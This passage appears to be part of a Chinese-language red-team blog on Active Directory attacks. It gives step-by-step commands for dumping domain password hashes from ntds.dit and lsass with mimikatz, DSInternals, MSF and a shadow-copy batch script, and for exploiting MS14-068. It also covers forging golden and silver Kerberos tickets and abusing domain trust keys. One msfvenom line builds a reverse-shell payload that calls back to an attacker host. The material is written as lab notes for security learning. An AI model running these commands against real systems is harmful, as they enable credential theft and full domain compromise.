<h3 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h3><p>NTDSDumpEx.exe 可以进行导出哈希值的操作，下载地址：<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p>
<pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>mimikatz 有个 dcsync 的功能，可以利用卷影拷贝服务直接读取 ntds.dit 文件，不过需要管理员权限。</p>
<p>导出域内所有用户的用户名和哈希值</p>
<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>导出域内指定用户的用户名和哈希值</p>
<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以通过转储 lsass.exe 进行 dump 操作</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug
lsadump::lsa &#x2F;inject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<blockquote>
<p>如果输出内容太多，可以使用 log 命令，这样操作就都会被记录到文本里了</p>
</blockquote>
<h3 id="Invoke-DCSync-ps1"><a href="#Invoke-DCSync-ps1" class="headerlink" title="Invoke-DCSync.ps1"></a>Invoke-DCSync.ps1</h3><p>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值</p>
<p>Invoke-DCSync.ps1 下载地址：<a target="_blank" rel="noopener" href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .&#x2F;Invoke-DCSync.ps1
Invoke-DCSync -PWDumpFormat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="MSF-2"><a href="#MSF-2" class="headerlink" title="MSF"></a>MSF</h3><p>msf 里的 psexec_ntdsgrab 可以获取目标的 ntds.dit 和 SYSTEM 并将其保存到 /root/.msf4/loot/ 目录下 </p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrab
set rhosts 192.168.7.7
set smbdomain teamssix.com
set smbuser administrator
set smbpass 1qaz@WSX
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>除此之外，在获取到会话后，也可以直接用 MSF 提供的模块获取 ntds.dit</p>
<pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdump
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>注意生成的 payload 需要和目标系统位数一致，不然会报错</p>
</blockquote>
<h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>DSInternals 主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p>
<p>DSInternals 下载地址：<a target="_blank" rel="noopener" href="https://github.com/MichaelGrafnetter/DSInternals/releases">https://github.com/MichaelGrafnetter/DSInternals/releases</a></p>
<p>安装 DSInternals</p>
<pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>直接导出 hash，并保存在 output_hash.txt 文件里</p>
<pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system&#39;
Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -Bootkey $key | Out-File output_hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>或者导出 hashcat 支持的 hash，并保存在 output_hashcat.txt 文件里</p>
<pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system.hive&#39;
Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="vshaow-和-QuarksPwDump"><a href="#vshaow-和-QuarksPwDump" class="headerlink" title="vshaow 和 QuarksPwDump"></a>vshaow 和 QuarksPwDump</h3><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p>
<p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p>
<p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p>
<p>QuarksPwDump 下载地址：<a target="_blank" rel="noopener" href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p>
<p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p>
<pre class="line-numbers language-none"><code class="language-none">setlocal
if NOT &quot;%CALLBACK_SCRIPT%&quot;&#x3D;&#x3D;&quot;&quot; goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER&#x3D;%SystemDrive%
set SOURCE_RELATIVE_PATH&#x3D;windows\ntds\ntds.dit
set DESTINATION_PATH&#x3D;%~dp0
@echo ...Determine the scripts to be executed&#x2F;generated...
set CALLBACK_SCRIPT&#x3D;%~dpnx0
set TEMP_GENERATED_SCRIPT&#x3D;GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
&quot;%~dp0vshadow.exe&quot; -script&#x3D;%TEMP_GENERATED_SCRIPT% -exec&#x3D;&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%
del &#x2F;f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%
reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a target="_blank" rel="noopener" href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p>
<p>Windows SDK 下载安装完后，找到 vshadow.exe ，我这里的路径是：</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\x64\vsstools\vshadow.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将这三个文件放到同一个文件夹里后，运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件</p>
<p>使用 esentutl 修复导出的 ntds.dit 文件</p>
<pre class="line-numbers language-none"><code class="language-none">esentutl &#x2F;p &#x2F;o ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后通过 QuarksPwDump.exe 导出域账号和散列值</p>
<pre class="line-numbers language-none"><code class="language-none">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 log 里就能看到导出的密码哈希了。</p>
<h1 id="0x27-Kerberos-域用户提权漏洞"><a href="#0x27-Kerberos-域用户提权漏洞" class="headerlink" title="0x27 Kerberos 域用户提权漏洞"></a>0x27 Kerberos 域用户提权漏洞</h1><h2 id="0、前言-7"><a href="#0、前言-7" class="headerlink" title="0、前言"></a>0、前言</h2><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p>
<p>不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。</p>
<p>14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。</p>
<h2 id="1、PyKEK"><a href="#1、PyKEK" class="headerlink" title="1、PyKEK"></a>1、PyKEK</h2><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a target="_blank" rel="noopener" href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p>
<p>使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。</p>
<p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p>
<pre class="line-numbers language-none"><code class="language-none">wmic qfe get hotfixid | findstr KB3011780<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看当前用户 SID</p>
<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者使用 wmic </p>
<pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>生成高权限票据，-d 指定域控地址</p>
<pre class="line-numbers language-none"><code class="language-none">python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>打开 mimikatz 清除当前内存中的票据信息</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将高权限票据注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 net use 连接域控后，使用 psexec 获取 Shell</p>
<blockquote>
<p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231733653.png"></p>
<h2 id="2、GoldenPac"><a href="#2、GoldenPac" class="headerlink" title="2、GoldenPac"></a>2、GoldenPac</h2><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p>
<p>Kali 在使用之前需要先安装 Kerberos 客户端</p>
<pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用 goldenPac.py 获取 Shell</p>
<pre class="line-numbers language-none"><code class="language-none">python3 goldenPac.py 0day.org&#x2F;jack:Aa123456@OWA2010SP3.0day.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109231746641.png"></p>
<p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p>
<h2 id="3、kekeo"><a href="#3、kekeo" class="headerlink" title="3、kekeo"></a>3、kekeo</h2><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
<p>使用之前需要先清除票据</p>
<pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后直接使用 kekeo 生成高权限票据</p>
<pre class="line-numbers language-none"><code class="language-none">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:0day.org &#x2F;user:jack &#x2F;password:Aa123456 &#x2F;ptt&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p>
<h2 id="4、MSF"><a href="#4、MSF" class="headerlink" title="4、MSF"></a>4、MSF</h2><p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksum
set domain 0day.org
set password Aa123456
set user jack
set user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133
set rhosts OWA2010SP3.0day.org
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件</p>
<p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>之后，生成一个木马</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.74 lport&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将木马复制到目标主机上，并使其上线到 MSF</p>
<p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p>
<pre class="line-numbers language-none"><code class="language-none">load kiwi
kerberos_ticket_use &#x2F;tmp&#x2F;0-00000000-jack@krbtgt-0DAY.ORG.kirbi
background<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>之后使用 current_user_psexec 模块</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexec
set session 2
set rhosts OWA2010SP3.0day.org
set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
set lhost 172.16.214.74
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后就会返回高权限的会话</p>
<blockquote>
<p>不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法</p>
</blockquote>
<h2 id="5、CS"><a href="#5、CS" class="headerlink" title="5、CS"></a>5、CS</h2><p>先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p>
<p>KrbCredExport 下载地址：<a target="_blank" rel="noopener" href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p>
<pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109240943968.png"></p>
<p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109241000974.png"></p>
<h1 id="0x28-黄金票据"><a href="#0x28-黄金票据" class="headerlink" title="0x28 黄金票据"></a>0x28 黄金票据</h1><h2 id="0、前言-8"><a href="#0、前言-8" class="headerlink" title="0、前言"></a>0、前言</h2><p>RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：</p>
<ul>
<li>伪造的域管理员用户名</li>
<li>完整的域名</li>
<li>域 SID</li>
<li>krbtgt 的 NTLM Hash 或 AES-256 值</li>
</ul>
<p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</p>
<p>在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</p>
<h2 id="1、导出-krbtgt-的-NTLM-Hash"><a href="#1、导出-krbtgt-的-NTLM-Hash" class="headerlink" title="1、导出 krbtgt 的 NTLM Hash"></a>1、导出 krbtgt 的 NTLM Hash</h2><p>在 mimikatz 下执行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里得到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087</p>
<p>该命令使用的 dcsync 功能远程转储 AD 里的 ntds.dit，使用 /user 参数，可以只导出指定用户的值。</p>
<p>或者使用以下命令获取 krbtgt 的 NTLM Hash ，域 SID 值，但该命令无法获取 AES-256 的值</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2、获取基本信息"><a href="#2、获取基本信息" class="headerlink" title="2、获取基本信息"></a>2、获取基本信息</h2><p>获取域 SID</p>
<pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里得到 administrator 的 SID 为  S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994</p>
<p>获取当前用户的 SID</p>
<pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查询域管理员账号</p>
<pre class="line-numbers language-none"><code class="language-none">net group &quot;domain admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查询域名</p>
<pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="3、制作黄金票据"><a href="#3、制作黄金票据" class="headerlink" title="3、制作黄金票据"></a>3、制作黄金票据</h2><p>先将票据清空</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>生成票据</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>传递票据并注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="4、验证权限"><a href="#4、验证权限" class="headerlink" title="4、验证权限"></a>4、验证权限</h2><p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271559013.png"></p>
<p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>命令完成之后，也会生成一个 Administrator.kiribi 文件，之后的操作就都一样了。</p>
<h2 id="5、MSF-下的利用"><a href="#5、MSF-下的利用" class="headerlink" title="5、MSF 下的利用"></a>5、MSF 下的利用</h2><p>首先上线一个普通用户，然后加载 kiwi 模块</p>
<pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>生成黄金票据</p>
<pre class="line-numbers language-none"><code class="language-none">golden_ticket_create -d teamssix.com -k d685b9c4fa2d318a9943ed68948af087 -s S-1-5-21-284927032-1122706408-2778656994 -u administrator -t &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将黄金票据注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202109271628454.png"></p>
<h1 id="0x29-白银票据"><a href="#0x29-白银票据" class="headerlink" title="0x29 白银票据"></a>0x29 白银票据</h1><h2 id="0、前言-9"><a href="#0、前言-9" class="headerlink" title="0、前言"></a>0、前言</h2><p>白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）</p>
<blockquote>
<p>Kerberos 协议详解：<a target="_blank" rel="noopener" href="https://teamssix.com/210923-151418.html">https://teamssix.com/210923-151418.html</a></p>
</blockquote>
<p>白银票据不与密钥分发中心 KDC 交互，因此没有了 Kerberos 认证协议里的前 4 步，通过伪造的票据授予服务 TGS 生成伪造的服务票据  ST 直接与服务器 Server 进行交互。</p>
<p>白银票据与黄金票据的区别：</p>
<p>1、白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</p>
<p>2、白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽，但白银票据的权限就远不如黄金票据的权限了</p>
<p>想利用白银票据需要先知道以下信息：</p>
<ul>
<li>域名</li>
<li>域 SID</li>
<li>目标服务器的 FQDN 即完整的域名</li>
<li>可利用的服务</li>
<li>服务账户的 NTLM 哈希</li>
<li>伪造的用户名即任意用户名</li>
</ul>
<h2 id="1、伪造-CIFS-服务权限"><a href="#1、伪造-CIFS-服务权限" class="headerlink" title="1、伪造 CIFS 服务权限"></a>1、伪造 CIFS 服务权限</h2><p>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p>
<pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到 HASH 后，清空当前系统中的票据，防止其他票据干扰</p>
<pre class="line-numbers language-none"><code class="language-none">klist purge# 或者在 mimikatz 里清除kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 mimikatz 生成伪造的白银票据</p>
<pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre><code>![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091330529.png)
</code></pre>
<p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p>
<h2 id="2、伪造-LDAP-服务权限"><a href="#2、伪造-LDAP-服务权限" class="headerlink" title="2、伪造 LDAP 服务权限"></a>2、伪造 LDAP 服务权限</h2><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p>
<pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p>
<p>接下来生成 LDAP 服务的白银票据</p>
<pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091403286.png"></p>
<h1 id="0x30-跨域安全"><a href="#0x30-跨域安全" class="headerlink" title="0x30 跨域安全"></a>0x30 跨域安全</h1><h2 id="0、前言-10"><a href="#0、前言-10" class="headerlink" title="0、前言"></a>0、前言</h2><p>常见的跨域攻击方法有以下几种：</p>
<p>i、利用常规的渗透方法，比如 Web 漏洞</p>
<p>ii、利用已知散列值进行哈希传递或票据传递，因为有可能域内的密码是通用的</p>
<p>iii、利用域信任关系</p>
<p>这里主要看第三种：域信任关系</p>
<p>当有多个域时，不同的域之间想进行资源共享，就需要用到域信任，只有当域之间互相信任后，才能进行资源共享。</p>
<p>域信任关系可分为单向信任和双向信任。单向信任即 A 信任 B，但 B 不信任 A，双向信任同理。在创建子域时，系统会在新的子域和父域之间自动创建双向可传递信任关系。</p>
<p>域信任关系又可分为内部信任和外部信任。内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的；外部信任指不同林之间域的信任关系，这种信任关系要视林间信任类型来判断是不是可传递。</p>
<p>在 Windows 操作系统中，只有 Domain Admins 组中的用户可以管理域信任关系；Enterprise Admins 组（仅出现在林的根域中）的成员对林中所有域拥有完全控制权限，默认情况下，该组包含林中所有域控上具有 administrators 权限的成员。</p>
<h2 id="1、获取域信息"><a href="#1、获取域信息" class="headerlink" title="1、获取域信息"></a>1、获取域信息</h2><p>这里使用工具 lg 进行域内信息的收集，lg 是一款用 C++ 编写的用于管理本地用户组和域本地用户组的命令行工具，可用它来收集远程主机用户和组的信息。</p>
<p>枚举 teamssix 域中的用户组</p>
<pre class="line-numbers language-none"><code class="language-none">lg.exe teamssix\.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>枚举远程计算机的用户组，如果提示拒绝访问，说明没有信任关系</p>
<pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>枚举远程计算机的用户名</p>
<pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>枚举远程系统中全部用户的 SID</p>
<pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>枚举远程系统指定组中的所有成员的 SID</p>
<pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc\administrators -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2、利用域信任密钥获取目标域权限"><a href="#2、利用域信任密钥获取目标域权限" class="headerlink" title="2、利用域信任密钥获取目标域权限"></a>2、利用域信任密钥获取目标域权限</h2><p>这里环境信息为：</p>
<p>父域的域控：dc.teamssix.com</p>
<p>子域的域控：subdc.sub.teamssix.com</p>
<p>子域内的计算机：user4.sub.teamssix.com</p>
<p>子域内的普通用户：user4</p>
<p>在子域的域控中使用 mimikatz 获取需要的信息</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:administrator&quot; &quot;lsadump::trust &#x2F;patch&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到当前域的 SID 、父域的 SID 和子域域管 NTLM 哈希后，在子域的普通用户机器上利用 mimikatz 制作信任票据</p>
<blockquote>
<p>这里的 sids 是父域的 sid，sids 后的 519 表示创建的用户属于父域的管理员组</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::golden &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;rc4:5bfd59b5e1f78a794f714af07eac869f &#x2F;user:administrator &#x2F;service:krbtgt &#x2F;target:teamssix.com &#x2F;ticket:subdc_administrator.kirbi&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 利用刚刚制作的信任票据获取目标域中目标服务的 TGS 并保存到文件中</p>
<pre class="line-numbers language-none"><code class="language-none">asktgs subdc_administrator.kirbi cifs&#x2F;dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将获取的 TGS 票据注入到内存中</p>
<pre class="line-numbers language-none"><code class="language-none">kirbikator lsa cifs.dc.teamssix.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 dir 访问目标域控</p>
<pre class="line-numbers language-none"><code class="language-none">dir \\dc.teamssix.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

